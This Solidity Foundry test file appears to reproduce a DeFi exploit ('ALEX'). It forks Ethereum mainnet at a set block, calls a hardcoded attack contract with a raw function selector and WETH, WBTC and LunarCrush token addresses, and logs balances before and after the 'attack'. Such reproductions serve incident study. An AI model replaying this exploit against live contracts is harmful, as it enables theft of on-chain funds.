// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

contract ALEXTest is Test {
    // IBalancerVault vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 LunarCrush = IERC20(0xA87135285Ae208e22068AcDBFf64B11Ec73EAa5A);
    IERC20 WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    address constant EXP = 0xfd9F795B4C15183BDbA83dA08Da02D5f9536748f;
    function setUp() public {
        vm.createSelectFork("mainnet", 19884363);
        deal(address(WETH), address(this), 0.1 ether);
        emit log_named_uint(
            "Before attack, WETH amount",
            WETH.balanceOf(address(this))
        );
        emit log_named_uint(
            "Before attack, WBTC amount",
            WBTC.balanceOf(address(this))
        );
        emit log_named_uint(
            "Before attack, Lunar amount",
            LunarCrush.balanceOf(address(this))
        );
    }

    function testExploit() public {
        
        bytes memory data = abi.encodeWithSelector(
            bytes4(0x8091c00e),
            address(this),
            address(0xfd9F795B4C15183BDbA83dA08Da02D5f9536748f),
            address(0xA87135285Ae208e22068AcDBFf64B11Ec73EAa5A),
            address(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599),
            address(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599)
        );
        (bool success, ) = EXP.call(data);
    require(success, "Call to EXP failed");
        emit log_named_uint(
            "after attack, WETH amount",
            WETH.balanceOf(address(this))
        );
        emit log_named_uint(
            "after attack, WBTC amount",
            WBTC.balanceOf(address(this))
        );
        emit log_named_uint(
            "after attack, Lunar amount",
            LunarCrush.balanceOf(address(this))
        );
    }
}
